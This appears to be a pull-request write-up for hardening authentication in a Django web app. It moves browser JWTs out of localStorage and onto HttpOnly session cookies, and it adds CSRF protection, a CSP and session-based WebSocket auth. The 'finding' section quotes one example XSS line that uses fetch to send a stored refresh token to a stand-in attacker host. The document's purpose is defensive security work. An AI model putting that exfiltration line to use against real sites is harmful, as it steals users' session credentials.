# Auth hardening: JWT out of `localStorage`, onto `HttpOnly` cookies

## The finding

The browser UI stored the SimpleJWT access **and** refresh tokens in
`localStorage` and read them back in 29 places. `localStorage` has no
`HttpOnly` equivalent, so any XSS anywhere on the site could do:

```js
fetch('https://evil.example/?t=' + localStorage.getItem('refresh_token'))
```

The refresh token lives for **7 days** and `ROTATE_REFRESH_TOKENS` means a
stolen one keeps minting fresh access tokens. So a single reflected-XSS bug
was a week-long full account takeover, usable from the attacker's own machine.

A second, quieter leak: WebSockets authenticated with `?token=<jwt>` in the
URL. Query strings are recorded in web-server access logs, proxy logs and
`Referer` headers, so live credentials were being written to plaintext logs.

## What changed

Browser auth now uses the **Django session cookie**, which is `HttpOnly` and
therefore invisible to JavaScript.

The key enabler: `SessionAuthentication` was **already** in
`REST_FRAMEWORK.DEFAULT_AUTHENTICATION_CLASSES`, and the login page was
already calling `/auth/session-login/` — so every API endpoint already
accepted session auth. The JWT was a redundant second credential. Verified
before touching anything: a session-only `POST /api/complaints/` (no
`Authorization` header) returns `201`.

| Area | Before | After |
|---|---|---|
| Login | `/auth/login/` → JWT in `localStorage`, *then* `/auth/session-login/` (password sent twice) | `/auth/session-login/` only; cookie set server-side |
| API calls | `Authorization: Bearer …` from `localStorage` | Session cookie + `X-CSRFToken` |
| WebSockets | `?token=<jwt>` in the URL | Session cookie on the handshake |
| Logout | Clear `localStorage` | Server invalidates the session |
| Google sign-in | Stored `data.access` / `data.refresh` | Ignores them; backend sets the cookie |

### CSRF

Cookie auth needs CSRF protection, which token auth did not. Every unsafe verb
now sends `X-CSRFToken`, and all such fetches carry `credentials: 'same-origin'`.
Verified: a write **with** CSRF returns `201`; the identical write **without**
it returns `403`.

### Cookie flags (`settings.py`)

```python
SESSION_COOKIE_HTTPONLY = True    # the whole point — JS cannot read it
SESSION_COOKIE_SAMESITE = 'Lax'
CSRF_COOKIE_HTTPONLY = False      # must stay readable; JS copies it into the header
SESSION_COOKIE_AGE = 60 * 60 * 12 # 12h, was an unbounded 7-day refresh window
SESSION_SAVE_EVERY_REQUEST = True
```

### WebSocket auth (`api_app/auth_middleware.py`)

Now `SessionOrJWTAuthMiddlewareStack`: session cookie first, `?token=` kept
only as a fallback for non-browser clients (mobile/scripts) that legitimately
hold a JWT and have no cookie. Verified: cookie-only handshake connects;
anonymous is rejected.

### Security headers (`waste_system/security.py`)

New `SecurityHeadersMiddleware` adds a CSP plus `Referrer-Policy`,
`Permissions-Policy` and `Cross-Origin-Opener-Policy`.

## Honest limitation: the CSP is not strict

`script-src` still includes `'unsafe-inline'`, because the app has **164
inline `onclick=`-style handlers** and ~30 inline `<script>` blocks. A
nonce/hash policy would refuse to run all of them and break the UI.

**So this CSP does not stop script injection.** What it does stop is the
payoff. `connect-src` is restricted to our own origin plus the four CDNs
actually in use, so injected JS cannot POST stolen data to an attacker
server; `form-action` and `base-uri` close the equivalent form/URL tricks.

Combined with `HttpOnly`, an XSS bug can still act *as* the user inside the
page, but can no longer **steal a credential and replay it later from
elsewhere** — which is the difference between a session-scoped incident and a
week of silent account access.

To get a strict `script-src`, migrate those inline handlers to
`addEventListener` in external JS. Mechanical but wide-reaching, so it was
deliberately kept out of this change.

## JWT endpoints are still live

`/auth/login/`, `/auth/token/refresh/` and `JWTAuthentication` remain for
non-browser API clients. Nothing was removed — the **browser** just stopped
using them.

## Verification performed

- Session-only API read/write for all three roles → `200` / `201`
- Write without CSRF → `403`
- `sessionid` cookie carries `HttpOnly`; `csrftoken` deliberately does not
- WebSocket: cookie-only connects, anonymous rejected
- 26 role pages × 2 languages → all `200`; Nepali intact (admin 278, driver 114, user 202 Devanagari words)
- 118 rendered inline JS blocks parse under `node --check`
- Grep audit: zero credential tokens in `localStorage`, zero tokens in WS URLs

`localStorage` still holds `safhasahar_theme`, `guest_claim_tokens` and
`current_guest_token`. These are **not credentials** — the guest tokens are
opaque handles for anonymous submissions — so they were intentionally left.

## Pre-existing issues found, not fixed here

1. `WasteRequestSerializer` lists `guest_email`, which is not a model field →
   `ImproperlyConfigured` on any request-serialising endpoint. **Already fixed
   on `main`** in commit `44a5bde`; this branch predates it. Merge `main` and
   it resolves.
2. `templates/web_app/profile.html` has one inline `<script>` that fails
   `node --check` on the pristine base commit too.
